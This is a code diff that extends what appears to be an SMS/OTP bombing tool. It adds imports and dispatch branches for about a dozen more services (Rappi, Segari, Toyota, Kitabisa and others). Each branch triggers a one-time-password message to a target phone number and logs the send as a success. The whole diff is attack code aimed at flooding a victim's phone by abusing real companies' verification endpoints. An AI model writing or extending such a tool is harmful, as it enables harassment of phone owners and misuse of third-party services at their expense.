@@ -24,7 +24,10 @@ from handlers import (
     send_hrsbre_otp, send_erafone_otp, send_beautyhaul_otp,
     send_hainaya_otp, send_minumyukkaka_otp, send_sidemang_otp,
     send_lapormasbup_otp, send_ptsp_kemenag_otp, send_planetban_otp,
-    send_klook_otp,send_duniagames_otp,send_tokopedia_otp
+    send_klook_otp,send_duniagames_otp,send_tokopedia_otp,send_mapclub_otp,
+    send_cmkclub_otp,send_babyhappy_otp,send_bukuaku_otp,send_generasi_otp,
+    send_insureka_otp,send_opaper_otp,send_rappi_otp,send_segari_otp,
+    send_toyota_otp,send_garasi_otp,send_jakartanote_otp,send_kitabisa_otp,
 )
 from targets import TARGETS
 
@@ -316,9 +319,113 @@ def process_target(api, target62, ip, idx, total):
             log_target(idx, total, name, status_text, detail)
             return success
 
+        elif post_type == 'mapclub':
+            number = api['number_fmt'](target62)
+            resp = send_mapclub_otp(number)
+            if resp and resp.status_code in [200, 201]:
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'cmkclub':
+            number = api['number_fmt'](target62)
+            resp = send_cmkclub_otp(number)
+            if resp and resp.status_code in [200, 201]:
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'babyhappy':
+            number = api['number_fmt'](target62)
+            resp = send_babyhappy_otp(number)
+            if resp and resp.status_code in [200, 201]:
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'bukuaku':
+            number = api['number_fmt'](target62)
+            resp = send_bukuaku_otp(number)
+            if resp and resp.status_code in [200, 201]:
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
         elif post_type == 'tokopedia':
             number = api['number_fmt'](target62)
             resp = send_tokopedia_otp(number)
+            if resp and resp.status_code in [200, 201]:
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'generasi':
+            number = api['number_fmt'](target62)
+            resp = send_generasi_otp(number)
+            if resp and resp.status_code in [200, 201]:
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'insureka':
+            number = api['number_fmt'](target62)
+            resp = send_insureka_otp(number)
+            if resp and resp.status_code in [200, 201]:
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'opaper':
+            number = api['number_fmt'](target62)
+            resp = send_opaper_otp(number)
+            if resp and resp.status_code in [200, 201]:
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'rappi':
+            number = api['number_fmt'](target62)
+            resp = send_rappi_otp(number)
+            if resp and resp.status_code in [200, 201]:
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'segari':
+            number = api['number_fmt'](target62)
+            resp = send_segari_otp(number)
+            if resp and resp.status_code in [200, 201]:
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'toyota':
+            number = api['number_fmt'](target62)
+            resp = send_toyota_otp(number)
+            if resp and resp.status_code in [200, 201]:
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'garasi':
+            number = api['number_fmt'](target62)
+            resp = send_garasi_otp(number)
+            if resp and resp.status_code in [200, 201]:
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'jakartanote':
+            number = api['number_fmt'](target62)
+            resp = send_jakartanote_otp(number)
+            if resp and resp.status_code in [200, 201]:
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'kitabisa':
+            number = api['number_fmt'](target62)
+            resp = send_kitabisa_otp(number)
             if resp and resp.status_code in [200, 201]:
                 status_text, detail, success = "SUCCESS", "OTP sent", True
             log_target(idx, total, name, status_text, detail)
